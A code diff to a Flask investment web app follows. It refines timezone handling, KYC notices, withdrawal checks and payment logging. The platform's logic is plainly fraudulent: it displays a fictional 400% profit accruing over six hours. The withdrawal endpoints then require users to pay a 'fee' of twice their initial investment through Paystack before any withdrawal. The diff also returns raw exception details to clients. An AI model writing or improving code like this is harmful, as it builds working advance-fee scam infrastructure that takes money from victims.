@@ -10,7 +10,6 @@ import hashlib
 import time
 import json
 import paypalrestsdk
-
 import hmac
 from decimal import Decimal
 from datetime import datetime
@@ -69,6 +68,18 @@ def kyc_required(f):
         
         return f(*args, **kwargs)
     return decorated_function
+
+def ensure_utc_datetime(dt):
+    """Ensure a datetime is timezone-aware and in UTC"""
+    if dt is None:
+        return None
+    
+    if dt.tzinfo is None:
+        # If naive, assume UTC
+        return dt.replace(tzinfo=timezone.utc)
+    else:
+        # If aware, convert to UTC
+        return dt.astimezone(timezone.utc)
 
 
 
@@ -411,8 +422,18 @@ def dashboard():
     notification_type = "none"
     
     if session["kyc_status"] == "not_verified":
-        # ... existing KYC notification code ...
-        pass
+        # Check if user has dismissed the notification
+        kyc_notification_dismissed = user.get("kyc_notification_dismissed", False)
+        
+        # Only show notification if not dismissed in the last 24 hours
+        if not kyc_notification_dismissed:
+            show_kyc_notification = True
+            notification_type = "kyc_required"
+            # Update last shown time
+            users_collection.update_one(
+                {"_id": user["_id"]},
+                {"$set": {"kyc_notification_last_shown": datetime.now(timezone.utc)}}
+            )
     
     # Handle different investment statuses
     investment_status = user.get("investment_status", "none")
@@ -443,7 +464,7 @@ def dashboard():
             })
     elif investment_status == "active" and user.get("investment_time"):
         # Calculate investment progress for active investments
-        investment_time = user["investment_time"]
+        investment_time = ensure_utc_datetime(user["investment_time"])
         current_time = datetime.now(timezone.utc)
         maturity_time = investment_time + timedelta(hours=6)
         elapsed_time = (current_time - investment_time).total_seconds()
@@ -505,6 +526,7 @@ def dashboard():
         user_kyc_submission=user_kyc_submission,
         flashed_messages=flashed_messages
     )
+
 @app.route("/forex_data")
 def forex_data():
     return jsonify({"forex_url": "https://fxpricing.com/fx-widget/market-currency-rates-widget.php?id=1,2,3,5,14,20"})
@@ -787,60 +809,118 @@ def change_password():
 
 @app.route("/check_withdrawal", methods=["POST"])
 def check_withdrawal():
+    """Check if withdrawal is available with timezone-aware datetime handling"""
     if "user_email" not in session:
         return jsonify({"error": "User not logged in!"}), 401
 
     user = users_collection.find_one({"email": session["user_email"]})
     
-    if not user or "investment_time" not in user:
-        return jsonify({"error": "No investment found!"}), 400
-
-    investment_time = user["investment_time"]
-    current_time = datetime.now(timezone.utc)
-    maturity_time = investment_time + timedelta(hours=6)
-    time_remaining = maturity_time - current_time
-
-    if current_time < maturity_time:
-        hours = time_remaining.seconds // 3600
-        minutes = (time_remaining.seconds % 3600) // 60
+    if not user:
+        return jsonify({"error": "User not found!"}), 404
+    
+    investment_status = user.get("investment_status", "none")
+    
+    # If no active investment
+    if investment_status != "active" or "investment_time" not in user:
         return jsonify({
-            "status": "pending",
-            "message": f"Profits will mature in {hours}h {minutes}m",
+            "status": "no_investment",
+            "message": "No active investment found!",
             "can_withdraw": False
         }), 200
-    
-    initial_amount = float(user.get("initial_investment", 0))
-    required_payment = initial_amount * 2
+
+    try:
+        # Use timezone-aware datetime handling
+        investment_time = ensure_utc_datetime(user["investment_time"])
+        current_time = datetime.now(timezone.utc)
+        maturity_time = investment_time + timedelta(hours=6)
         
-    return jsonify({
-        "status": "ready",
-        "message": f"Pay ${required_payment:.2f} to withdraw profits",
-        "required_payment": required_payment,
-        "can_withdraw": True
-    }), 200
+        # Ensure maturity_time is timezone-aware
+        if maturity_time.tzinfo is None:
+            maturity_time = maturity_time.replace(tzinfo=timezone.utc)
+        
+        time_remaining = maturity_time - current_time
+
+        # If investment hasn't matured yet
+        if current_time < maturity_time:
+            hours = int(time_remaining.total_seconds() // 3600)
+            minutes = int((time_remaining.total_seconds() % 3600) // 60)
+            seconds = int(time_remaining.total_seconds() % 60)
+            
+            return jsonify({
+                "status": "pending",
+                "message": f"Profits will mature in {hours}h {minutes}m {seconds}s",
+                "can_withdraw": False,
+                "time_remaining_seconds": int(time_remaining.total_seconds()),
+                "maturity_time": maturity_time.isoformat(),
+                "current_time": current_time.isoformat()
+            }), 200
+        
+        # Investment has matured
+        initial_amount = float(user.get("initial_investment", 0))
+        required_payment = initial_amount * 2
+        
+        return jsonify({
+            "status": "ready",
+            "message": f"Pay ${required_payment:.2f} to withdraw profits",
+            "required_payment": required_payment,
+            "can_withdraw": True,
+            "maturity_time": maturity_time.isoformat(),
+            "current_time": current_time.isoformat(),
+            "elapsed_hours": round((current_time - investment_time).total_seconds() / 3600, 2)
+        }), 200
+        
+    except Exception as e:
+        print(f"Error in check_withdrawal: {e}")
+        import traceback
+        traceback.print_exc()
+        return jsonify({
+            "error": "Failed to check withdrawal status",
+            "details": str(e)
+        }), 500
 
 @app.route("/process_withdrawal", methods=["POST"])
 @kyc_required
 def process_withdrawal():
+    """Process withdrawal payment with timezone-aware datetime handling"""
     if "user_email" not in session:
         return jsonify({"error": "User not logged in!"}), 401
 
     try:
         user = users_collection.find_one({"email": session["user_email"]})
         
-        if not user or "investment_time" not in user:
-            return jsonify({"error": "No investment found!"}), 400
+        if not user:
+            return jsonify({"error": "User not found!"}), 404
+        
+        investment_status = user.get("investment_status", "none")
+        
+        # Validate investment status
+        if investment_status != "active" or "investment_time" not in user:
+            return jsonify({"error": "No active investment found!"}), 400
 
-        investment_time = user["investment_time"]
+        # Check maturity with timezone-aware datetime handling
+        investment_time = ensure_utc_datetime(user["investment_time"])
         current_time = datetime.now(timezone.utc)
         maturity_time = investment_time + timedelta(hours=6)
         
+        # Ensure maturity_time is timezone-aware
+        if maturity_time.tzinfo is None:
+            maturity_time = maturity_time.replace(tzinfo=timezone.utc)
+        
+        # Check if investment has matured
         if current_time < maturity_time:
-            return jsonify({"error": "Withdrawal not yet available!"}), 400
+            time_left = maturity_time - current_time
+            hours = int(time_left.total_seconds() // 3600)
+            minutes = int((time_left.total_seconds() % 3600) // 60)
+            
+            return jsonify({
+                "error": f"Withdrawal not yet available! Please wait {hours}h {minutes}m for maturity."
+            }), 400
 
+        # Calculate required payment
         initial_amount_usd = float(user.get("initial_investment", 0))
         required_payment_usd = initial_amount_usd * 2
 
+        # Convert to KES for payment processing
         conversion_response = requests.get(
             f"http://{request.host}/convert_currency?amount={required_payment_usd}&from=USD&to=KES"
         )
@@ -851,6 +931,7 @@ def process_withdrawal():
             
         required_payment_kes = conversion_data["converted"]
 
+        # Initialize Paystack payment
         headers = {
             "Authorization": f"Bearer {PAYSTACK_SECRET_KEY}",
             "Content-Type": "application/json"
@@ -864,9 +945,13 @@ def process_withdrawal():
             "metadata": {
                 "purpose": "withdrawal_fee",
                 "original_amount_usd": required_payment_usd,
+                "converted_amount_kes": required_payment_kes,
+                "initial_investment": initial_amount_usd,
                 "plan": user.get("investment_plan", "unknown"),
                 "is_withdrawal": True,
-                "user_id": session.get("user_id")
+                "user_id": session.get("user_id"),
+                "investment_matured_at": maturity_time.isoformat(),
+                "withdrawal_requested_at": current_time.isoformat()
             }
         }
 
@@ -878,17 +963,47 @@ def process_withdrawal():
         response_data = response.json()
 
         if response_data.get("status"):
+            # Log withdrawal attempt
+            withdrawal_log = {
+                "user_id": session["user_id"],
+                "email": session["user_email"],
+                "initial_investment": initial_amount_usd,
+                "required_payment_usd": required_payment_usd,
+                "required_payment_kes": required_payment_kes,
+                "paystack_reference": response_data["data"]["reference"],
+                "investment_time": investment_time,
+                "maturity_time": maturity_time,
+                "requested_at": current_time,
+                "status": "pending_payment",
+                "payment_gateway": "paystack"
+            }
+            
+            # Store in a separate collection for tracking
+            db["withdrawal_requests"].insert_one(withdrawal_log)
+            
             return jsonify({
                 "status": True,
                 "message": "Payment initialized successfully",
-                "data": response_data["data"]
+                "data": response_data["data"],
+                "amount_kes": required_payment_kes,
+                "amount_usd": required_payment_usd,
+                "reference": response_data["data"]["reference"],
+                "authorization_url": response_data["data"]["authorization_url"]
             })
+        
+        # Handle Paystack error
         return jsonify({
             "status": False,
-            "message": response_data.get("message", "Payment initialization failed")
+            "message": response_data.get("message", "Payment initialization failed"),
+            "details": response_data
         }), 400
 
+    except requests.exceptions.RequestException as e:
+        return jsonify({"error": f"Payment gateway error: {str(e)}"}), 500
     except Exception as e:
+        print(f"Error in process_withdrawal: {e}")
+        import traceback
+        traceback.print_exc()
         return jsonify({"error": f"Withdrawal processing failed: {str(e)}"}), 500
 
 @app.route("/withdrawal_callback", methods=["GET"])
@@ -959,22 +1074,13 @@ def investment_details():
 
 @app.route("/api/realtime_investment_data", methods=["GET"])
 def realtime_investment_data():
+    """API endpoint for real-time investment data with timezone-aware datetime handling"""
     if "user_email" not in session:
         return jsonify({"error": "User not logged in!"}), 401
 
     user = users_collection.find_one({"email": session["user_email"]})
-
     if not user:
-        return jsonify({
-            "error": "User not found",
-            "profit": 0.0,
-            "initial_investment": 0.0,
-            "current_value": 0.0,
-            "time_progress": 0.0,
-            "hours_remaining": 0,
-            "minutes_remaining": 0,
-            "investment_status": "none"
-        }), 200
+        return jsonify({"error": "User not found"}), 404
 
     investment_status = user.get("investment_status", "none")
     
@@ -1012,10 +1118,11 @@ def realtime_investment_data():
     # Handle missing investment_time
     investment_time = user.get("investment_time")
     if not investment_time or investment_status != "active":
+        initial_investment = float(user.get("initial_investment", 0.0))
         return jsonify({
             "profit": 0.0,
-            "initial_investment": float(user.get("initial_investment", 0.0)),
-            "current_value": 0.0,
+            "initial_investment": initial_investment,
+            "current_value": initial_investment,
             "time_progress": 0.0,
             "hours_remaining": 0,
             "minutes_remaining": 0,
@@ -1023,21 +1130,36 @@ def realtime_investment_data():
         }), 200
 
     try:
-        # Calculate investment progress
-        investment_time = user["investment_time"]
+        # Calculate investment progress with timezone-aware datetimes
+        investment_time = ensure_utc_datetime(investment_time)
         initial_investment = float(user.get("initial_investment", 0.0))
         current_time = datetime.now(timezone.utc)
         maturity_time = investment_time + timedelta(hours=6)
 
+        # Ensure maturity_time is also timezone-aware
+        if maturity_time.tzinfo is None:
+            maturity_time = maturity_time.replace(tzinfo=timezone.utc)
+
+        # Calculate elapsed time and progress
         elapsed_time = (current_time - investment_time).total_seconds()
         total_duration = timedelta(hours=6).total_seconds()
-        time_progress = min(max(elapsed_time / total_duration, 0), 1)
+        
+        # Handle edge cases
+        if elapsed_time < 0:
+            elapsed_time = 0
+        if elapsed_time > total_duration:
+            elapsed_time = total_duration
+            
+        time_progress = elapsed_time / total_duration
 
+        # Calculate investment value (400% return over 6 hours)
         current_value = initial_investment * (1 + 4 * time_progress)
         profit = current_value - initial_investment
 
-        hours_remaining = max(int((maturity_time - current_time).total_seconds() // 3600), 0)
-        minutes_remaining = max(int(((maturity_time - current_time).total_seconds() % 3600) // 60), 0)
+        # Calculate time remaining
+        time_left = max(maturity_time - current_time, timedelta(0))
+        hours_remaining = int(time_left.total_seconds() // 3600)
+        minutes_remaining = int((time_left.total_seconds() % 3600) // 60)
 
         return jsonify({
             "profit": round(profit, 2),
@@ -1046,11 +1168,20 @@ def realtime_investment_data():
             "time_progress": round(time_progress * 100, 2),
             "hours_remaining": hours_remaining,
             "minutes_remaining": minutes_remaining,
-            "investment_status": investment_status
+            "investment_status": investment_status,
+            "maturity_time": maturity_time.isoformat(),
+            "current_time": current_time.isoformat()
         }), 200
+        
     except Exception as e:
         print(f"Error in /api/realtime_investment_data: {e}")
-        return jsonify({"error": "Failed to fetch investment data"}), 500
+        import traceback
+        traceback.print_exc()
+        return jsonify({
+            "error": "Failed to fetch investment data",
+            "details": str(e)
+        }), 500
+    
 @app.route("/manual_payment_notice", methods=["POST"])
 def manual_payment_notice():
     if "user_email" not in session:
